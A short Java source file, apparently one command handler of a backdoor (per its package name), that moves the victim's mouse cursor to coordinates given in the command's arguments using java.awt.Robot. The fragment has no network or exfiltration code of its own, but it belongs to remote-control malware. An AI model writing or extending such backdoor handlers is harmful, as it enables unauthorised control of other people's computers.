package net.jaguargaming.backdoor.commandhandlers;

import java.awt.AWTException;
import java.awt.Robot;

public class CMDmousepos {
	
	public static void handle(String[] args) throws IllegalArgumentException, AWTException {
		if (args.length != 2) {
			throw new IllegalArgumentException("Wrong argument length");
		}
		try {
			Robot robot = new Robot();
			robot.mouseMove(Integer.parseInt(args[0]), Integer.parseInt(args[1]));
		} catch (AWTException e) {
			throw e;
		} catch (NumberFormatException e) {
			throw e;
		}
	}
	
}
